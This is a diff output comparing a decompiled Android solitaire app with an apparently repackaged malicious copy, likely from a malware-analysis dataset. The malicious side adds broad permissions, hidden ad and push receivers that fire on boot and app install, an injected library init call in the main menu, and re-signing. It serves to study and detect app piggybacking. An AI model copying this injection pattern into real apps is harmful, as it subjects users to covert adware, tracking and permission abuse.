@@ -1,0 +1,2333 @@
+diff -r result/APP_29/App_B_29/AndroidManifest.xml result/APP_29/App_M_29/AndroidManifest.xml
+3a4,17
+>     <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+>     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+>     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+>     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+>     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+>     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+>     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+>     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+>     <uses-permission android:name="android.permission.RESTART_PACKAGES"/>
+>     <uses-permission android:name="android.permission.WAKE_LOCK"/>
+>     <uses-permission android:name="android.permission.GET_TASKS"/>
+>     <uses-permission android:name="android.permission.VIBRATE"/>
+>     <uses-permission android:name="com.android.vending.BILLING"/>
+>     <uses-permission android:name="android.permission.INTERNET"/>
+21a36,63
+>         <activity android:excludeFromRecents="true" android:launchMode="singleInstance" android:name="com.slegl.push.MainActivity"/>
+>         <service android:name="com.slegl.push.MainService"/>
+>         <receiver android:name="com.slegl.push.MainReceiver">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>         </receiver>
+>         <activity android:configChanges="keyboardHidden|orientation" android:name="net.cadegessdad.iad.AdPushActivity"/>
+>         <receiver android:name="net.cadegessdad.iad.AdPushReceiver">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.intent.action.BOOT_COMPLETED"/>
+>             </intent-filter>
+>         </receiver>
+>         <service android:name="net.cadegessdad.iad.AdPushService"/>
+>         <meta-data android:name="INIT_KEY" android:value="8378ab9e731b476d8b38c0c9ca246bf4,10251,tf9i8oofq0ux79aw,20121122,1"/>
+>         <meta-data android:name="UMENG_APPKEY" android:value="500fc8cf5270155c50000017"/>
+>         <meta-data android:name="UMENG_CHANNEL" android:value="gfan"/>
+diff -r result/APP_29/App_B_29/apktool.yml result/APP_29/App_M_29/apktool.yml
+2c2
+< apkFileName: Bapp29-35C23CD66B10959BF79501DAA7E7ADD06DC2FDBE8FEBC68FC7D4AAD623CA0B35.apk
+---
+> apkFileName: Mapp29-77C591664485427287535C8BE4CAA67AACE75342AA48766C720189301603C680.apk
+5,6d4
+< - resources.arsc
+< - jpg
+7a6
+> - jpg
+Somente em result/APP_29/App_M_29/: assets
+Somente em result/APP_29/App_M_29/com: geseng
+Somente em result/APP_29/App_M_29/com: slegl
+diff -r result/APP_29/App_B_29/com/smilerlee/solitaire/game/FreecellGame.java result/APP_29/App_M_29/com/smilerlee/solitaire/game/FreecellGame.java
+641c641
+<       arrayOfCharSequence[0] = localResources.getText(2131361896);
+---
+>       arrayOfCharSequence[0] = localResources.getText(2131361894);
+643,645c643,645
+<       arrayOfCharSequence[2] = localResources.getText(2131361895);
+<       arrayOfCharSequence[3] = localResources.getText(2131361898);
+<       arrayOfCharSequence[4] = localResources.getText(2131361897);
+---
+>       arrayOfCharSequence[2] = localResources.getText(2131361893);
+>       arrayOfCharSequence[3] = localResources.getText(2131361896);
+>       arrayOfCharSequence[4] = localResources.getText(2131361895);
+688c688
+<       arrayOfCharSequence[0] = localResources.getText(2131361896);
+---
+>       arrayOfCharSequence[0] = localResources.getText(2131361894);
+690,691c690,691
+<       arrayOfCharSequence[2] = localResources.getText(2131361895);
+<       arrayOfCharSequence[3] = localResources.getText(2131361898);
+---
+>       arrayOfCharSequence[2] = localResources.getText(2131361893);
+>       arrayOfCharSequence[3] = localResources.getText(2131361896);
+diff -r result/APP_29/App_B_29/com/smilerlee/solitaire/game/FreecellShuffle.java result/APP_29/App_M_29/com/smilerlee/solitaire/game/FreecellShuffle.java
+19c19
+<     int[] arrayOfInt2 = { 3, 2, 1, 0, 27, 26, 25, 24, 51, 50, 49, 48, 23, 22, 21, 20, 47, 46, 45, 44, 19, 18, 17, 16, 43, 42, 41, 40, 15, 14, 13, 12, 39, 38, 37, 36, 11, 10, 9, 8, 35, 34, 33, 32, 7, 6, 5, 4, 31, 30, 29, 28 };
+---
+>     int[] arrayOfInt2 = { 51, 50, 49, 48, 23, 22, 21, 20, 47, 46, 45, 44, 19, 18, 17, 16, 43, 42, 41, 40, 15, 14, 13, 12, 39, 38, 37, 36, 11, 10, 9, 8, 35, 34, 33, 32, 7, 6, 5, 4, 31, 30, 29, 28, 3, 2, 1, 0, 27, 26, 25, 24 };
+21c21
+<     easterEggs = new int[][] { arrayOfInt1, arrayOfInt2, { 51, 50, 49, 48, 23, 22, 21, 20, 47, 46, 45, 44, 19, 18, 17, 16, 43, 42, 41, 40, 15, 14, 13, 12, 39, 38, 37, 36, 11, 10, 9, 8, 35, 34, 33, 32, 7, 6, 5, 4, 31, 30, 29, 28, 3, 2, 1, 0, 27, 26, 25, 24 }, arrayOfInt3 };
+---
+>     easterEggs = new int[][] { arrayOfInt1, { 3, 2, 1, 0, 27, 26, 25, 24, 51, 50, 49, 48, 23, 22, 21, 20, 47, 46, 45, 44, 19, 18, 17, 16, 43, 42, 41, 40, 15, 14, 13, 12, 39, 38, 37, 36, 11, 10, 9, 8, 35, 34, 33, 32, 7, 6, 5, 4, 31, 30, 29, 28 }, arrayOfInt2, arrayOfInt3 };
+diff -r result/APP_29/App_B_29/com/smilerlee/solitaire/game/Game.java result/APP_29/App_M_29/com/smilerlee/solitaire/game/Game.java
+918c918
+<       arrayOfCharSequence[0] = localResources.getText(2131361896);
+---
+>       arrayOfCharSequence[0] = localResources.getText(2131361894);
+920,921c920,921
+<       arrayOfCharSequence[2] = localResources.getText(2131361898);
+<       arrayOfCharSequence[3] = localResources.getText(2131361897);
+---
+>       arrayOfCharSequence[2] = localResources.getText(2131361896);
+>       arrayOfCharSequence[3] = localResources.getText(2131361895);
+961c961
+<       arrayOfCharSequence[0] = localResources.getText(2131361896);
+---
+>       arrayOfCharSequence[0] = localResources.getText(2131361894);
+963c963
+<       arrayOfCharSequence[2] = localResources.getText(2131361898);
+---
+>       arrayOfCharSequence[2] = localResources.getText(2131361896);
+1106,1107c1106,1107
+<       setButton(-3, paramContext.getText(2131361896), this);
+<       setButton(-2, paramContext.getText(2131361897), this);
+---
+>       setButton(-3, paramContext.getText(2131361894), this);
+>       setButton(-2, paramContext.getText(2131361895), this);
+diff -r result/APP_29/App_B_29/com/smilerlee/solitaire/game/SolitaireGame.java result/APP_29/App_M_29/com/smilerlee/solitaire/game/SolitaireGame.java
+3,10d2
+< import android.app.Activity;
+< import android.app.AlertDialog;
+< import android.app.AlertDialog.Builder;
+< import android.content.Context;
+< import android.content.DialogInterface;
+< import android.content.DialogInterface.OnCancelListener;
+< import android.content.DialogInterface.OnClickListener;
+< import android.content.res.Resources;
+14d5
+< import com.smilerlee.solitaire.SolitaireView;
+16d6
+< import com.smilerlee.solitaire.Statistics;
+502,508c492
+<         if (!isCompleted()) {
+<           break label43;
+<         }
+<       }
+<       label43:
+<       for (paramInt = Options.vegas_money;; paramInt = i + Options.vegas_money) {
+<         return FormatUtils.vegasScore(paramInt);
+---
+>         paramInt = i + Options.vegas_money;
+509a494
+>       return FormatUtils.vegasScore(paramInt);
+551,614d535
+<   }
+<   
+<   public void openGameMenu()
+<   {
+<     setIgnoreEvent(true);
+<     Resources localResources = getContext().getResources();
+<     CharSequence[] arrayOfCharSequence;
+<     if (Options.back_button_undo)
+<     {
+<       arrayOfCharSequence = new CharSequence[5];
+<       arrayOfCharSequence[0] = localResources.getText(2131361896);
+<       arrayOfCharSequence[1] = localResources.getText(2131361893);
+<       arrayOfCharSequence[2] = localResources.getText(2131361894);
+<       arrayOfCharSequence[3] = localResources.getText(2131361898);
+<       arrayOfCharSequence[4] = localResources.getText(2131361897);
+<     }
+<     for (;;)
+<     {
+<       new AlertDialog.Builder(getContext()).setTitle(2131361860).setItems(arrayOfCharSequence, new DialogInterface.OnClickListener()
+<       {
+<         public void onClick(DialogInterface paramAnonymousDialogInterface, int paramAnonymousInt)
+<         {
+<           SolitaireGame.this.setIgnoreEvent(false);
+<           switch (paramAnonymousInt)
+<           {
+<           default: 
+<             return;
+<           case 0: 
+<             SolitaireGame.this.restartGame();
+<             return;
+<           case 1: 
+<             Options.set("draw_three", false);
+<             SolitaireGame.this.view.newGame(SolitaireGame.this.getType());
+<             return;
+<           case 2: 
+<             Options.set("draw_three", true);
+<             SolitaireGame.this.view.newGame(SolitaireGame.this.getType());
+<             return;
+<           case 3: 
+<             Statistics.show(SolitaireGame.this.getContext(), SolitaireGame.this.getType());
+<             return;
+<           }
+<           ((Activity)SolitaireGame.this.getContext()).finish();
+<         }
+<       }).setNeutralButton(2131361864, new DialogInterface.OnClickListener()
+<       {
+<         public void onClick(DialogInterface paramAnonymousDialogInterface, int paramAnonymousInt)
+<         {
+<           paramAnonymousDialogInterface.cancel();
+<         }
+<       }).setOnCancelListener(new DialogInterface.OnCancelListener()
+<       {
+<         public void onCancel(DialogInterface paramAnonymousDialogInterface)
+<         {
+<           SolitaireGame.this.setIgnoreEvent(false);
+<         }
+<       }).create().show();
+<       return;
+<       arrayOfCharSequence = new CharSequence[4];
+<       arrayOfCharSequence[0] = localResources.getText(2131361896);
+<       arrayOfCharSequence[1] = localResources.getText(2131361893);
+<       arrayOfCharSequence[2] = localResources.getText(2131361894);
+<       arrayOfCharSequence[3] = localResources.getText(2131361898);
+<     }
+diff -r result/APP_29/App_B_29/com/smilerlee/solitaire/MainMenu.java result/APP_29/App_M_29/com/smilerlee/solitaire/MainMenu.java
+38a39
+> import com.geseng.Dienghla;
+327a329
+>     Dienghla.init(this);
+diff -r result/APP_29/App_B_29/com/smilerlee/solitaire/R.java result/APP_29/App_M_29/com/smilerlee/solitaire/R.java
+489,492c489,492
+<     public static final int bg1_name = 2131361925;
+<     public static final int bg2_name = 2131361926;
+<     public static final int bg3_name = 2131361927;
+<     public static final int bg4_name = 2131361928;
+---
+>     public static final int bg1_name = 2131361923;
+>     public static final int bg2_name = 2131361924;
+>     public static final int bg3_name = 2131361925;
+>     public static final int bg4_name = 2131361926;
+494,501c494,501
+<     public static final int card_badk1_name = 2131361929;
+<     public static final int card_badk2_name = 2131361930;
+<     public static final int card_badk3_name = 2131361931;
+<     public static final int card_badk4_name = 2131361932;
+<     public static final int color_blue = 2131361923;
+<     public static final int color_green = 2131361921;
+<     public static final int color_orange = 2131361922;
+<     public static final int color_red = 2131361924;
+---
+>     public static final int card_badk1_name = 2131361927;
+>     public static final int card_badk2_name = 2131361928;
+>     public static final int card_badk3_name = 2131361929;
+>     public static final int card_badk4_name = 2131361930;
+>     public static final int color_blue = 2131361921;
+>     public static final int color_green = 2131361919;
+>     public static final int color_orange = 2131361920;
+>     public static final int color_red = 2131361922;
+559c559
+<     public static final int exit = 2131361900;
+---
+>     public static final int exit = 2131361898;
+564c564
+<     public static final int main_menu = 2131361897;
+---
+>     public static final int main_menu = 2131361895;
+576,577d575
+<     public static final int new_game_draw_1 = 2131361893;
+<     public static final int new_game_draw_3 = 2131361894;
+582,605c580,603
+<     public static final int orientation_auto = 2131361933;
+<     public static final int orientation_landsacpe = 2131361935;
+<     public static final int orientation_portrait = 2131361934;
+<     public static final int preference_back_button_undo_summary = 2131361910;
+<     public static final int preference_back_button_undo_title = 2131361909;
+<     public static final int preference_background_summary = 2131361902;
+<     public static final int preference_background_title = 2131361901;
+<     public static final int preference_card_back_summary = 2131361904;
+<     public static final int preference_card_back_title = 2131361903;
+<     public static final int preference_draw_three_summary = 2131361912;
+<     public static final int preference_draw_three_title = 2131361911;
+<     public static final int preference_orientation_summary = 2131361906;
+<     public static final int preference_orientation_title = 2131361905;
+<     public static final int preference_sound_summary = 2131361908;
+<     public static final int preference_sound_title = 2131361907;
+<     public static final int preference_spider_restricted_deal_summary = 2131361920;
+<     public static final int preference_spider_restricted_deal_title = 2131361919;
+<     public static final int preference_spider_suits_summary = 2131361918;
+<     public static final int preference_spider_suits_title = 2131361917;
+<     public static final int preference_vegas_cumulative_summary = 2131361916;
+<     public static final int preference_vegas_cumulative_title = 2131361915;
+<     public static final int preference_vegas_mode_summary = 2131361914;
+<     public static final int preference_vegas_mode_title = 2131361913;
+<     public static final int restart = 2131361896;
+---
+>     public static final int orientation_auto = 2131361931;
+>     public static final int orientation_landsacpe = 2131361933;
+>     public static final int orientation_portrait = 2131361932;
+>     public static final int preference_back_button_undo_summary = 2131361908;
+>     public static final int preference_back_button_undo_title = 2131361907;
+>     public static final int preference_background_summary = 2131361900;
+>     public static final int preference_background_title = 2131361899;
+>     public static final int preference_card_back_summary = 2131361902;
+>     public static final int preference_card_back_title = 2131361901;
+>     public static final int preference_draw_three_summary = 2131361910;
+>     public static final int preference_draw_three_title = 2131361909;
+>     public static final int preference_orientation_summary = 2131361904;
+>     public static final int preference_orientation_title = 2131361903;
+>     public static final int preference_sound_summary = 2131361906;
+>     public static final int preference_sound_title = 2131361905;
+>     public static final int preference_spider_restricted_deal_summary = 2131361918;
+>     public static final int preference_spider_restricted_deal_title = 2131361917;
+>     public static final int preference_spider_suits_summary = 2131361916;
+>     public static final int preference_spider_suits_title = 2131361915;
+>     public static final int preference_vegas_cumulative_summary = 2131361914;
+>     public static final int preference_vegas_cumulative_title = 2131361913;
+>     public static final int preference_vegas_mode_summary = 2131361912;
+>     public static final int preference_vegas_mode_title = 2131361911;
+>     public static final int restart = 2131361894;
+610,611c608,609
+<     public static final int select_game = 2131361895;
+<     public static final int settings = 2131361899;
+---
+>     public static final int select_game = 2131361893;
+>     public static final int settings = 2131361897;
+618,640c616,638
+<     public static final int stat_average_winning_moves = 2131361951;
+<     public static final int stat_average_winning_time = 2131361949;
+<     public static final int stat_current_money = 2131361957;
+<     public static final int stat_current_streak = 2131361954;
+<     public static final int stat_draw_1 = 2131361936;
+<     public static final int stat_draw_3 = 2131361937;
+<     public static final int stat_fewest_winning_moves = 2131361950;
+<     public static final int stat_freecell = 2131361939;
+<     public static final int stat_games_played = 2131361945;
+<     public static final int stat_games_won = 2131361946;
+<     public static final int stat_high_score = 2131361944;
+<     public static final int stat_longest_losing_streak = 2131361953;
+<     public static final int stat_longest_winning_streak = 2131361952;
+<     public static final int stat_most_money_lost = 2131361956;
+<     public static final int stat_most_money_won = 2131361955;
+<     public static final int stat_shortest_winning_time = 2131361948;
+<     public static final int stat_spider_1_suit = 2131361940;
+<     public static final int stat_spider_2_suits = 2131361941;
+<     public static final int stat_spider_3_suits = 2131361942;
+<     public static final int stat_spider_4_suits = 2131361943;
+<     public static final int stat_vegas = 2131361938;
+<     public static final int stat_win_percentage = 2131361947;
+<     public static final int statistics = 2131361898;
+---
+>     public static final int stat_average_winning_moves = 2131361949;
+>     public static final int stat_average_winning_time = 2131361947;
+>     public static final int stat_current_money = 2131361955;
+>     public static final int stat_current_streak = 2131361952;
+>     public static final int stat_draw_1 = 2131361934;
+>     public static final int stat_draw_3 = 2131361935;
+>     public static final int stat_fewest_winning_moves = 2131361948;
+>     public static final int stat_freecell = 2131361937;
+>     public static final int stat_games_played = 2131361943;
+>     public static final int stat_games_won = 2131361944;
+>     public static final int stat_high_score = 2131361942;
+>     public static final int stat_longest_losing_streak = 2131361951;
+>     public static final int stat_longest_winning_streak = 2131361950;
+>     public static final int stat_most_money_lost = 2131361954;
+>     public static final int stat_most_money_won = 2131361953;
+>     public static final int stat_shortest_winning_time = 2131361946;
+>     public static final int stat_spider_1_suit = 2131361938;
+>     public static final int stat_spider_2_suits = 2131361939;
+>     public static final int stat_spider_3_suits = 2131361940;
+>     public static final int stat_spider_4_suits = 2131361941;
+>     public static final int stat_vegas = 2131361936;
+>     public static final int stat_win_percentage = 2131361945;
+>     public static final int statistics = 2131361896;
+Somente em result/APP_29/App_M_29/com: umeng
+Somente em result/APP_29/App_M_29/: net
+Os arquivos binários result/APP_29/App_B_29/original/AndroidManifest.xml e result/APP_29/App_M_29/original/AndroidManifest.xml são diferentes
+Somente em result/APP_29/App_B_29/original/META-INF: FRUITSMO.RSA
+Somente em result/APP_29/App_B_29/original/META-INF: FRUITSMO.SF
+diff -r result/APP_29/App_B_29/original/META-INF/MANIFEST.MF result/APP_29/App_M_29/original/META-INF/MANIFEST.MF
+2c2
+< Created-By: 1.6.0_33 (Sun Microsystems Inc.)
+---
+> Created-By: 1.6.0 (Sun Microsystems Inc.)
+8c8
+< SHA1-Digest: 2sX1JBb0pFkyfopqY/F8yXAMXCc=
+---
+> SHA1-Digest: wxiFfjYMhVLLzMOyomnYSIKCTr8=
+11c11,14
+< SHA1-Digest: fJT1zZCrL5nnqsyi2sNNGG8VwOU=
+---
+> SHA1-Digest: R87qAAqWZ0kxDKzduuMzFxdVXEQ=
+> 
+> Name: assets/tosleng/push_cancel_btn.png
+> SHA1-Digest: xFZxC1NS0KoZjvtGL4hUEAZ1oMM=
+17c20
+< SHA1-Digest: KVJBE8XErCy5nVCdwr5oBj/I/XY=
+---
+> SHA1-Digest: kH2UHWEfB6Ifr7qe5ZeG20R4Kvc=
+24a28,30
+> Name: res/layout/dm_dialog_activity.xml
+> SHA1-Digest: r2DMIpYcOh7N/ork2mx+MVGqs3A=
+> 
+28,30d33
+< Name: res/layout/dm_dialog_activity.xml
+< SHA1-Digest: +8+ur5lj095+dKYLQS/4++o9jfw=
+< 
+46,48d48
+< Name: res/layout/dm_gamecenter_activity.xml
+< SHA1-Digest: hGph/oA6zUvoF1AeNZNo3S0mld0=
+< 
+51a52,54
+> Name: res/layout/dm_gamecenter_activity.xml
+> SHA1-Digest: VZb2Qa60l5B1rqy1NPYUSYCipdo=
+> 
+54a58,60
+> Name: assets/tosleng/push_cancel_btn_pressed.png
+> SHA1-Digest: CbQHVmHL3PxfmzP+MMFrIUI9vT4=
+> 
+64,66d69
+< Name: res/drawable-nodpi/card_img_spades_k.png
+< SHA1-Digest: BSHmP7nvG99z7ZJl/ZCvtJO1vm4=
+< 
+69a73,75
+> Name: res/drawable-nodpi/card_img_spades_k.png
+> SHA1-Digest: BSHmP7nvG99z7ZJl/ZCvtJO1vm4=
+> 
+77c83
+< SHA1-Digest: /fjVzQUmNvQeNlRZiK2px9UKql4=
+---
+> SHA1-Digest: TgSt8bNxvNvBiPA/LLQy3dAgRCc=
+86c92
+< SHA1-Digest: abAAua9zlILQnqHt5V/HmtkBW+Q=
+---
+> SHA1-Digest: RlzrJFGbqU+dVL0sr2Yvr8EhaAI=
+93a100,102
+> Name: res/layout/dm_friends_view.xml
+> SHA1-Digest: +d40pDU3G811xsgxf5NjrlTwLO4=
+> 
+97,99d105
+< Name: res/layout/dm_friends_view.xml
+< SHA1-Digest: Bzaod2PGU7C8wiqpy48rnIWL28Y=
+< 
+110c116
+< SHA1-Digest: ed5g9D70XuRbvDomTTgQHWfxRHs=
+---
+> SHA1-Digest: ZfsT7dpk7VrLbvMR8SaaNa7nb1Y=
+116c122
+< SHA1-Digest: 0S0VHRpK11wARGQd6L8lJKSGi6I=
+---
+> SHA1-Digest: ly9zezzPNNs52XTf/PHcm+Dn7AI=
+120a127,129
+> Name: assets/tosleng/icon.png
+> SHA1-Digest: xojjGOMaFE9l5JGijGWsO/RgymY=
+> 
+130,132d138
+< Name: res/layout/dm_promote_dialog.xml
+< SHA1-Digest: DpjD4a2PCFNDK+L0HMI5EptK7oA=
+< 
+134c140,143
+< SHA1-Digest: u/lVAD3S8DFZ4cGyhMrDXeC8WRo=
+---
+> SHA1-Digest: YFTWMtzYS78TW2FKHp4fefgXCFI=
+> 
+> Name: res/layout/dm_promote_dialog.xml
+> SHA1-Digest: xg5wOIggtgalJ+o2zI04L/dVcdI=
+144a154,156
+> Name: res/layout/dm_userinfo_view_listview.xml
+> SHA1-Digest: 6BCfeaLWoWAbFDqik80yGghhk48=
+> 
+146c158
+< SHA1-Digest: T8Zg3YqiL5WYRAKH7rD5IxaiK6M=
+---
+> SHA1-Digest: W77TYji7LNPF4LByqBsr6z6X4Yk=
+149,152c161
+< SHA1-Digest: 2Mc1uvsEa8OIdEnwfdryueGcsEI=
+< 
+< Name: res/layout/dm_userinfo_view_listview.xml
+< SHA1-Digest: jP0Xg/5/U96c26haVEs72A1BCjA=
+---
+> SHA1-Digest: Nt9F35BsRh2HZJPvcikSFYuP444=
+154,155c163,164
+< Name: res/drawable-nodpi/card_red_2.png
+< SHA1-Digest: G0VcVxF0szrNxeD7lNf/NZ+6LM0=
+---
+> Name: assets/tosleng/fold_arrow.png
+> SHA1-Digest: aPV5nrym+b3yv4JxlPO9BHg6+k0=
+159a169,171
+> Name: res/drawable-nodpi/card_red_2.png
+> SHA1-Digest: G0VcVxF0szrNxeD7lNf/NZ+6LM0=
+> 
+164c176
+< SHA1-Digest: 7s2cI5NGREtU16H9GDL258Vv0v8=
+---
+> SHA1-Digest: 9Ujvusre1y4pMLjD7LbITwO+jMA=
+182c194
+< SHA1-Digest: RViNNbiS+S9gbbMSi2UZCMv27RE=
+---
+> SHA1-Digest: qYqBvIIhh/b8dtPTR+ZyLCkTgUc=
+185c197
+< SHA1-Digest: EHbTLe9J62NxkswBPU+nMDz6EEM=
+---
+> SHA1-Digest: 52oZApGHkmkyHYUs2kDGkM0hAec=
+188c200
+< SHA1-Digest: mj4hKRB32v7KLV6FmRjLfQ33r9M=
+---
+> SHA1-Digest: fP/u1WQO3onoxxLGqwzyNr8NviU=
+203c215
+< SHA1-Digest: 7oLY9DlKUQ8cIvgTI2tqOD53lFY=
+---
+> SHA1-Digest: JETpYYav/uEZKJFf9y1UfKjq5+Q=
+224c236
+< SHA1-Digest: 70R3I2ssInNigPLCSk89ZcASNIw=
+---
+> SHA1-Digest: u4tnbR8skhxcHpCWkdgeTqhxdi0=
+227c239
+< SHA1-Digest: mnnoT/SxdlH7tJcKMxHAftp6AOY=
+---
+> SHA1-Digest: QnZXRtRs6VrdkcPDMX5LajbK6pk=
+272c284
+< SHA1-Digest: sslKP5Hed26ywtKuXc+b/hCN62g=
+---
+> SHA1-Digest: 1VLhwDrMY/uodN7yBzxiT1I50x4=
+275c287
+< SHA1-Digest: MHSBP7aAHFsC5d1jTes1fyZ9ZgA=
+---
+> SHA1-Digest: 4qOJ0VRUuPwnp1VfsR9EcpRSOxE=
+284c296
+< SHA1-Digest: s38fvoE//4ewRuGDq/+pKAS2Ayc=
+---
+> SHA1-Digest: cfKeoZi/LIYLgG4HL33umicsyU4=
+288a301,303
+> Name: assets/tosleng/download_btn2_pressed.png
+> SHA1-Digest: AtUClOw6HmlJO+VrNZ7YD/BWibQ=
+> 
+300a316,318
+> Name: assets/tosleng/spot_default.png
+> SHA1-Digest: E4fi2Oiw3vnkWEnhps2hIa4+gp8=
+> 
+305c323
+< SHA1-Digest: DUC+HcXlrGMZG+LlvTidEn5BEr0=
+---
+> SHA1-Digest: YyW4EPWEtUKu7pAd03V9PVtbvNc=
+312a331,333
+> Name: res/layout/dm_userinfo_view.xml
+> SHA1-Digest: Qe5dWRGQegZEHYtL8sDtAb6hWOY=
+> 
+316,318d336
+< Name: res/layout/dm_userinfo_view.xml
+< SHA1-Digest: ZGd0PDJ+XsIpSiiqphtxkeXwdAM=
+< 
+334,335c352,353
+< Name: res/drawable-nodpi/card_red_3.png
+< SHA1-Digest: a97jUiKa/ff7kx8nTJNaCQt5TT8=
+---
+> Name: assets/tosleng/360.png
+> SHA1-Digest: l+Fj8rnP63ymLQTbbTeI2n7q89k=
+340,341c358,359
+< Name: res/drawable/dm_tab_bottom_left.xml
+< SHA1-Digest: /vq2CQyWvdmQa7z09WRKmDafJcs=
+---
+> Name: res/drawable-nodpi/card_red_3.png
+> SHA1-Digest: a97jUiKa/ff7kx8nTJNaCQt5TT8=
+344c362,365
+< SHA1-Digest: pXNOqlu5WfY5A/CD2HxYtnjSBXg=
+---
+> SHA1-Digest: ip406S6u56ruqhPEhYDI6hjJBlw=
+> 
+> Name: res/drawable/dm_tab_bottom_left.xml
+> SHA1-Digest: +4cwury5QnhB0KyrG5C6d80AzkM=
+350c371
+< SHA1-Digest: BsMQfTh3liLnhM+xVx/EYXWbOXg=
+---
+> SHA1-Digest: Iy0ZHo29Us07nnM5fHhfDT4jdns=
+368c389
+< SHA1-Digest: yMbw542wpDgnFRwVb2MVdyEZZdM=
+---
+> SHA1-Digest: ChV7/G+xWB8CsYXwf7AS4pkrh+A=
+372a394,396
+> Name: assets/tosleng/confirm_btn_pressed.png
+> SHA1-Digest: oY/MZIRapnKGabQhUv9sd8CPCbQ=
+> 
+386c410
+< SHA1-Digest: H5byB8QkuyMeRwOFuf/hmFcAATI=
+---
+> SHA1-Digest: N3XhNB2tSaqfUve7iSoX7nlIo/I=
+392c416
+< SHA1-Digest: ccYxFUvBKSktK6yl8G2pxWlDTUo=
+---
+> SHA1-Digest: WqqUzuqGaJSN/rN4CBVnCH+azv4=
+396a421,423
+> Name: assets/tosleng/download_btn2.png
+> SHA1-Digest: MBPHHzDxFqdfXsBLtm7DSajWU1w=
+> 
+398c425,428
+< SHA1-Digest: zG0Ees0LJ6aMwq3oxUw+pucFBrk=
+---
+> SHA1-Digest: CagLyqZ7d1h0zEaKEWY/jt7gfRQ=
+> 
+> Name: res/layout/dm_profile_view.xml
+> SHA1-Digest: dWQoIHEyYnEhjpgwWnwxb/kV75A=
+406,408d435
+< Name: res/layout/dm_profile_view.xml
+< SHA1-Digest: JtP6pxyzahmzjfeXVwsgNunmkUc=
+< 
+419c446
+< SHA1-Digest: GCYNIpWD2ZeW3O64gx/yJtFNd0o=
+---
+> SHA1-Digest: tKQrHU025ESZuHHF5mMS1WWUdU4=
+424,426d450
+< Name: res/drawable/main_menu_settings_pressed.png
+< SHA1-Digest: Ibzw4xSstj5FskSJ7AJ6P0AfR0I=
+< 
+429a454,456
+> Name: res/drawable/main_menu_settings_pressed.png
+> SHA1-Digest: Ibzw4xSstj5FskSJ7AJ6P0AfR0I=
+> 
+434c461
+< SHA1-Digest: LuJcfGLyuoY16vLVcchn1zLNp48=
+---
+> SHA1-Digest: 8I1I72b4HjbeQqkL7RsmJx4pUpo=
+437c464
+< SHA1-Digest: 7eM5XNp/kxkvmExzikHhR7DcPd0=
+---
+> SHA1-Digest: KnjPZU1yWxXXkMkiJsNHXtVv4Q8=
+440c467
+< SHA1-Digest: Fa4s4+uFjnSfEZCYKw8IfpcbwSU=
+---
+> SHA1-Digest: 2OLQk8NKg1QttnJGG3sEMbKN+Dk=
+446c473
+< SHA1-Digest: vlFj2g/UEVuvEWr6cAttXoJ1dhM=
+---
+> SHA1-Digest: Pc2fyN/HnXvwHqgOHROUrU9y320=
+454,456d480
+< Name: res/layout/dm_moregames.xml
+< SHA1-Digest: gS3rf77aEeXOH7vvgeeR5FUqYA0=
+< 
+458c482,485
+< SHA1-Digest: JPQ6NKQFbfthsz5NdEbl7hTuX7c=
+---
+> SHA1-Digest: VvOpPaZcRZuigefOCOPUI+ZRYII=
+> 
+> Name: res/layout/dm_moregames.xml
+> SHA1-Digest: HRbgIhesDbm6SadRHCcpx8ObUCs=
+466,468d492
+< Name: res/layout/dm_featureview_layout.xml
+< SHA1-Digest: naWwrq8vA/RqdiUx5J/ieSy/STQ=
+< 
+470c494,497
+< SHA1-Digest: rW4JUA9U1AMJKhMfnwhXkwp0YT4=
+---
+> SHA1-Digest: RHPQRCD+P5zs8ji4Lmb2PiqxJA8=
+> 
+> Name: res/layout/dm_featureview_layout.xml
+> SHA1-Digest: kBilm5N230Fx4srUD/DpIR4ae8c=
+476c503
+< SHA1-Digest: DTiDO0aVQv7c5ZjMkEgUSjslQYg=
+---
+> SHA1-Digest: 1s7ofpH4W0Put2oVIuUKEvaNc2U=
+479c506
+< SHA1-Digest: tlMWrhJ36CZhk0F1VFI1wPdDl9U=
+---
+> SHA1-Digest: 5YDyf/yReuXNAfbjwuHzgslxlAA=
+512c539
+< SHA1-Digest: ceqnvUiBnV2w+QoK+Hw2a0gDVwQ=
+---
+> SHA1-Digest: J943MSGQvUIEXfTh8kmuHnBBoec=
+521c548
+< SHA1-Digest: 4TJ8o+M831SUuIP+KJsxbMocpKo=
+---
+> SHA1-Digest: /+gzrGbJqBo5mtqodqzi2dcMv/k=
+525a553,555
+> Name: AndroidManifest.xml
+> SHA1-Digest: Tpau3MWi/x195pSvI2FNaeRMeMo=
+> 
+529,530c559,560
+< Name: AndroidManifest.xml
+< SHA1-Digest: d0+8nCiPU5w9tSF7Mp06koQmntQ=
+---
+> Name: res/drawable/dm_bg.9.png
+> SHA1-Digest: Jm4IVVG9zjUNgsHjDtdgiqamW+g=
+535,537d564
+< Name: res/drawable/dm_bg.9.png
+< SHA1-Digest: Jm4IVVG9zjUNgsHjDtdgiqamW+g=
+< 
+542c569
+< SHA1-Digest: Suj22BpsEOXgWn+JfsnykHEu3rU=
+---
+> SHA1-Digest: xv5pHMX0w4CE/ZNngUTXo2T//t0=
+547,549d573
+< Name: res/drawable-nodpi/font_1.png
+< SHA1-Digest: unifS4pI+RlQwzGb8F8wgtcyK5Y=
+< 
+552a577,579
+> Name: res/drawable-nodpi/font_1.png
+> SHA1-Digest: unifS4pI+RlQwzGb8F8wgtcyK5Y=
+> 
+554c581
+< SHA1-Digest: juydkJjnv8+v4m51rdOn/fIVORU=
+---
